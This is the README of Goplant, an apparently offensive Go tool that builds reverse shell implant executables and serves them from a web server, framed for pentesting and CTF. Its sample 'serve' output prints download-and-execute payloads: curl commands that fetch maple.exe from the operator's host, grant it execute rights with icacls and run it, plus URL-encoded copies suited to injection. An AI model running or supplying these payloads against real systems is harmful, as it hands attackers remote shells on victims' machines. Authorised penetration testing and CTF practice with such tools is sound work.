
# Goplant

<center>
<img src='img/goplant_logo.png' />
</center>

Goplant generates executable reverse shell implants for pentesting and CTF. 


```bash
Goplant generates executable reverse shell implants for pentesting

Usage:
  goplant [command]

Available Commands:
  completion  Generate the autocompletion script for the specified shell
  generate    Generate a reverse shell implant
  help        Help about any command
  list        List available templates
  serve       Start an implant server

Flags:
  -h, --help   help for goplant

Use "goplant [command] --help" for more information about a command.
```

## Installation 

```bash
go install github.com/CamilleGR/goplant@latest
```

## Generate 

The `generate` command generate a new executable accordingly to targetted arch ans operating system. It take lhost and lport parameters as metasploit or msfvenom.

## Serve 

The serve command allows you to directly generate an implant and serve it on a web server. It reduce the number of action to get your reverse shell. 

Goplant show you some example commands to execute to download and execute your payload

```bash
goplant serve --lhost 10.10.15.144 --lport 4444 --arch amd64  --os windows
    ______      ____  __            __ 
  / ____/___  / __ \/ /___ _____  / /_
 / / __/ __ \/ /_/ / / __ `/ __ \/ __/
/ /_/ / /_/ / ____/ / /_/ / / / / /_  
\____/\____/_/   /_/\__,_/_/ /_/\__/

🪴Listen on:   http://0.0.0.0:1337/maple.exe

🪴 Implant : windows/amd64 --> 192.168.0.1:4444


🪴 Payloads : 


🪴 Payloads : 
curl http://192.168.0.1:1337/maple.exe -O
curl.exe http://192.168.0.1:1337/maple.exe -O && icacls maple.exe /grant Everyone:RX  && ./maple.exe
Url encoded : 
curl+http%3A%2F%2F192.168.0.1%3A1337%2Fmaple.exe+-O%0A
curl.exe+http%3A%2F%2F192.168.0.1%3A1337%2Fmaple.exe+-O+%26%26+icacls+maple.exe+%2Fgrant+Everyone%3ARX++%26%26+.%2Fmaple.exe%0A

```

---

